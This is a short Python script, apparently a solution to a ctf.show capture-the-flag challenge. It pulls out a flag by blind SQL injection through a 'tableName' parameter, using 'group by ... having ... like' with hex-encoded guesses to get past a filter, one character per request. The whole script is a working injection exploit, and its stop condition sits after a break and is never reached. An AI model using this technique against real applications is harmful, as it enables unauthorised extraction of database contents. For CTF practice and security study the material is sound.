import requests
import sys

url = 'http://74cb8d43-be70-4911-becb-97bc98d25e45.challenge.ctf.show/select-waf.php'
flag = 'ctfshow{'
letter = "0123456789abcdefghijklmnopqrstuvwxyz-{}"

def asc2hex(s):
    a1 = ''
    a2 = ''
    for i in s:
        a1+=hex(ord(i))
    a2 = a1.replace("0x","")
    return a2
for i in range(100):
    for j in letter:
        payload = {
            "tableName":"ctfshow_user group by pass having pass like {}".format("0x"+asc2hex(flag+j+"%"))
        }
        r = requests.post(url=url,data=payload).text
        if "$user_count = 1;" in r:
            flag+=j
            print(flag)
            break
            if j == "}":
                sys.exit()
